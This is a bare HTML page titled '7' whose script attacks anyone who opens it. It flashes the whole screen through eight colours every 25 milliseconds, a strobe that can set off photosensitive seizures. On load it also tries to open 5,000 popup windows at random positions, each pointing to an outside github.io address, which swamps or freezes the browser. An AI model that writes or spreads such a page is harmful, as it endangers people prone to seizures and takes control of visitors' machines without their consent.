<!DOCTYPE html>
<html>
<head>
  <title>7</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
      overflow: hidden;
    }
  </style>
  <script>
    const colors = [
      "#FF0000", // Red
      "#00FF00", // Green
      "#0000FF", // Blue
      "#FFFF00", // Yellow
      "#FF00FF", // Magenta
      "#00FFFF", // Cyan
      "#FFFFFF", // White
      "#000000"  // Black
    ];

    let i = 0;

    setInterval(() => {
      document.body.style.backgroundColor = colors[i];
      i = (i + 1) % colors.length;
    }, 25);
    window.onload = function() {
      const url = 'https://flakka736.github.io/nickle';
      const width = 320;
      const height = 240;
      const screenWidth = window.screen.availWidth;
      const screenHeight = window.screen.availHeight;

      for (let i = 0; i < 5000; i++) {
        const left = Math.floor(Math.random() * (screenWidth - width));
        const top = Math.floor(Math.random() * (screenHeight - height));

        window.open(
          url,
          '_blank',
          `width=${width},height=${height},left=${left},top=${top}`
        );
      }
    };
  </script>
</head>
<body>
</body>
</html>
